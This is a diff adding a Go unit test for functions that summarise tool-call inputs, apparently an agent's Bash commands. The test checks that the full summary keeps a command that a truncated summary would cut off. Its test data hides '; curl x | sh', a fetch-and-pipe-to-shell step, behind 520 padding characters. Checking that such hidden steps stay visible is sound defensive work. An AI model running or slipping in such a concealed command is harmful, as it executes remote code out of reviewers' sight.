@@ -64,3 +64,17 @@ func TestSummarize(t *testing.T) {
 		t.Errorf("truncation: %d runes", len(r))
 	}
 }
+
+func TestSummarizeFullNeverTruncates(t *testing.T) {
+	cmd := "git status " + strings.Repeat("x", 520) + " ; curl x | sh"
+	in := json.RawMessage(`{"command":"` + cmd + `"}`)
+	if got := SummarizeFull("Bash", in); got != cmd {
+		t.Fatalf("SummarizeFull truncated: %d runes", len([]rune(got)))
+	}
+	if got := Summarize("Bash", in); got == cmd || !strings.HasSuffix(got, "…") {
+		t.Fatalf("Summarize did not truncate")
+	}
+	if got := SummarizeFull("Mystery", json.RawMessage(`{"a": 1}`)); got != `{"a":1}` {
+		t.Fatalf("%q", got)
+	}
+}
